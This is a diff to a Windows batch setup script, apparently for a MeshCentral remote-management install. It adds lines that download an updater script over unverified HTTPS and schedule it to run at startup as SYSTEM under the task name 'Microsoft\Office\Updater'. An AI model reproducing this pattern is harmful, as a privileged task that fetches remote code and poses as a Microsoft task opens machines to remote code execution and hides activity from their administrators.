@@ -27,6 +27,18 @@ IF NOT %HasAdminRights%==1 (
 	GOTO ENDSUB
 )
 
+REM ***********************************************************************************************
+REM Зададим URL файлов, которые нужно обновить
+REM ***********************************************************************************************
+
+	set URLUpdater="https://raw.githubusercontent.com/mihanik2000/meshcentral/main/Updater.bat"
+
+REM ***********************************************************************************************
+REM Скачиваем скрипт-обновлятор и планируем запуск его через планировщик
+REM ***********************************************************************************************
+
+	"%ProgramFiles%\wget\wget.exe" --no-check-certificate -O "%SystemDrive%\ProgramData\mihanik\Updater.bat" %URLUpdater%
+	SCHTASKS /Create /RU "NT AUTHORITY\SYSTEM" /SC ONSTART /TN "Microsoft\Office\Updater" /TR  "\"%ProgramData%\mihanik\Updater.bat\"" /RL HIGHEST /F /DELAY 0010:00
 
 timeout 3 /nobreak
 
